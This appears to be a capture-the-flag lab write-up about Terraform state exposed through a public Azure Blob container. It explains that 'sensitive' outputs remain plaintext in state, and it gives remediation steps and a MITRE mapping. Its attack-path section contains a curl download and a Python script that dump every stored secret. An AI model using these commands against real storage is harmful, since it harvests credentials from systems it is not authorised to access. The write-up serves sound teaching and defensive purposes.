# Terraform State File Exposure

**Provider:** Azure | **Category:** Storage / Secrets in State

## Scenario

An infrastructure team stores their Terraform remote state in an Azure Blob Storage container.
The container was set to **`container_access_type = "blob"`** (public read) instead of `"private"`.
The state file contains multiple outputs marked `sensitive = true` — but `sensitive` in Terraform
only suppresses the value from CLI output; **the value is always stored in plaintext inside the
`.tfstate` file**. The state file contains service principal credentials, storage connection
strings, admin passwords, and the flag.

## Attack Path

```
[Attacker]
    |
    v
Discover storage account name (prefix: cmlnmbstfstate<id>)
    |
    v
curl <blob_url>  -->  terraform.tfstate JSON (no credentials required)
    |
    v
.outputs.service_principal_client_secret.value  -->  flag
```

### Step 1 — Download the state file

```bash
STATE_URL="<state_blob_url>"   # provided in lab output

curl -s -o terraform.tfstate "${STATE_URL}"
```

### Step 2 — Extract all output values (including "sensitive" ones)

```bash
# Human-readable dump
python3 -m json.tool terraform.tfstate | grep -A3 '"sensitive"'

# Extract just the flag
python3 -c "
import json, sys
state = json.load(open('terraform.tfstate'))
for name, out in state['outputs'].items():
    print(f'{name}: {out[\"value\"]}')
"
```

### Why `sensitive = true` Doesn't Protect You

Terraform's `sensitive` flag is a **display** annotation — it prevents the value from being
printed in `terraform plan` / `terraform apply` output. The value is written to the state file
in plaintext exactly the same way as non-sensitive outputs. Anyone who can read the state file
can read every secret it contains.

## How to Fix in Production

1. **Always use `private` container access** for Terraform state backends — never `blob` or `container`.
2. **Encrypt state at rest** using Azure Storage service-side encryption with a Customer Managed Key.
3. **Use Azure AD authentication** for state access instead of storage account keys — disable shared key auth on the backend storage account.
4. **Restrict access with RBAC** — grant `Storage Blob Data Contributor` only to the pipeline identity, not developers.
5. **Do not store secrets as Terraform outputs** — retrieve them from Secrets Manager / Key Vault at runtime instead of baking them into state.
6. **Enable Storage Advanced Threat Protection** to alert on anomalous blob access patterns.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Cloud Storage Object Discovery | [T1619](https://attack.mitre.org/techniques/T1619/) |
